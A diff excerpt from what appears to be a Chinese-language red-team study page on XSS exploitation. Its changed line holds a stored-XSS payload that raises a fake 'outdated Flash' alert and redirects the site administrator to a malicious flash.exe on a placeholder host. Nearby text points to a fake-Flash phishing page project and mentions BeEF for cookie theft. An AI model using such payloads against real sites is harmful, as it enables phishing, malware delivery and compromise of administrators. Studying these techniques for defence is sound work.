@@ -3641,7 +3641,7 @@ fclose($fp);
 <p>Ps：可在后续红队钓鱼篇章学习钓鱼页面制作</p>
 <p><a href="https://github.com/r00tSe7en/Fake-flash.cn">https://github.com/r00tSe7en/Fake-flash.cn</a></p>
 <p><font style="background-color:#81BBF8;">1.制作一个钓鱼页面，下载指向一个恶意文件</font></p>
-<p><font style="background-color:#81BBF8;">2.配合贷款那个xss漏洞写入(<script>alert('当前浏览器Flash版本过低,请下载升级！');location.href='<a href="http://x.x.x.x/flash.exe">http://x.x.x.x/flash.exe</a>'</script>)，管理员一看记录就会弹窗，安全意识低就回去下载，然后就被控了</font></p>
+<p><font style="background-color:#81BBF8;">2.配合贷款那个xss漏洞写入<sc ript>alert(‘当前浏览器Flash版本过低,请下载升级！’);location.href&#x3D;’<a href="http://x.x.x.x/flash.exe">http://x.x.x.x/flash.exe</a>‘</script>，管理员一看记录就会弹窗，安全意识低就回去下载，然后就被控了</font></p>
 <h1 id="四、XSS跨站-攻击利用-溯源综合"><a href="#四、XSS跨站-攻击利用-溯源综合" class="headerlink" title="四、XSS跨站-攻击利用-溯源综合"></a>四、XSS跨站-攻击利用-溯源综合</h1><p>浏览器控制框架<font style="background-color:#ED740C;">-beef-xss</font></p>
 <p><font style="background-color:#81BBF8;">这个我没有复现，这个和蓝莲花也是类似，就是触发xss以后我们能做更多的东西，比如获取Cookie，页面劫持等等。</font></p>
 <p>只需执行JS文件，即可实现对当前浏览器的控制，可配合各类手法利用</p>
